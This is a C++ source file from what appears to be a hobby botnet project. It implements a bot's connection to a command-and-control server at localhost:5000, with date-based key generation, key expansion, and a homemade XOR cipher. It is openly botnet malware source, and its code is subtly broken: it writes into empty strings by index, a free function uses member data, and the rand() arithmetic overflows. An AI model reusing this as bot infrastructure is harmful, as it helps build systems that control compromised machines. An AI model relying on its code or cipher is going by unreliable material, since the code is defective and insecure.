#include <iostream>
#include <windows.h>
#include <cmath>

#include "master_conn.h"
#include "http_client.h"
#include "http_request.h"

namespace botnet{
    master_conn::master_conn() {
        typedef botnet::http::http_request http_request;
        typedef botnet::http::http_client http_client;

        http_request *http_req = new http_request(botnet::http::GET);
        http_request::headers header;
        header.add("Host", "localhost:5000");
        std::string path = "?k_c=" + std::to_string(client_key) +
            "&confirm=" + std::to_string(confirm_msg);

        http_req->setPath(path);
        http_req->setHeaders(header);

        http_client *http_c = new http_client("localhost", 5000);
        http_c->request(http_req);

        std::cout << http_c->getContent() << '\n';
    }
   
    int master_conn::keyGen() {
        SYSTEMTIME lt;
        int day = 0;
        int base = 0;
        int r = 0;
        int key;

        GetLocalTime(&lt);
        day = lt.wDay;
        base = (day + 1) * (day + 2) * (day + 3) * (day + 13);
        r = (int) (INT_MAX / 2 + floor(rand() * INT_MAX / 2));
        key = base ^ r;
        return key;
    }


	std::string master_conn::expand_key (std::string str_key){
  		const std::string ALPHA = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
		const int ALPHA_SIZE = ALPHA.length(); 
  
		std::string exp_key = "";
	    int n = str_key.length();
		int i = 0;
		int index;
	    for (i = 0; i < n/2; i++){
			exp_key = exp_key
		               + ALPHA[((int)str_key[i] + (int)str_key[i+1]) % ALPHA_SIZE]
		               + ALPHA[(((int)str_key[i]) * ((int)str_key[n-i-1])) % ALPHA_SIZE];
		}
	    for (i = 0; i < n; i++){
			index = (((int)ALPHA[((int)str_key[i]) % ALPHA_SIZE]) + i*i ) % ALPHA_SIZE;
			exp_key = exp_key + ALPHA[index];
		}
		return exp_key;
	}

	std::string master_conn::combineKeys(int keyServer){
        return expand_key(std::to_string(keyServer ^ my_rand));
	}

	std::string master_conn::encrypt(std::string m){
		int i;
		int j = 0;
		std::string c = "";
        int iv = count_conn;
        std::string k = hash_key; /* this.hash_key */;
		for (i = 0; i < m.length(); i++){
	    	c[i] = ((char)(iv ^ m[i] ^ k[j]));
			j = (j + 1) % k.length();
			if (j == 0)
				iv = (iv + 1) % 256;
		}
		return c;
	}


    bool confirm(std::string msg_from_server){
		return encrypt(confirm_msg) == msg_from_server;
	}
	
	std::string master_conn::decrypt (std::string c){
		int j = 0;
		int i;
		std::string m = "";
        int iv = count_conn; /* this.count numero de conexoes */;
        std::string k = hash_key; /* this.expanded_private_key*/;
		for (i = 0; i < c.length(); i++){
			m[i] = (iv ^ c[i] ^ k[j]);
            j = (j + 1) % k.length();
	        if (j == 0)
	        	iv = (iv + 1) % 256;
		}
		return m;
	}



}
